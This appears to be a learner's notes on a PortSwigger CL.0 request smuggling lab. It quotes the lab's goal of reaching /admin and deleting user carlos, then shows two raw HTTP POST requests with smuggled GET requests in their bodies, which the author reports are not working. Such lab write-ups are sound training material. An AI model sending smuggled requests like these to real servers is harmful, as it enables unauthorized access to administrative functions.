# CL.0 request smuggling

This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints.

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.

In my case it does not work when creating a group, I send the same request twice (using always HTTP/1):

``` 
POST /resources/images/blog.svg HTTP/1.1
...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

``` 
POST /resources/images/blog.svg HTTP/1.1
...
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /admin HTTP/1.1
Foo: x
```
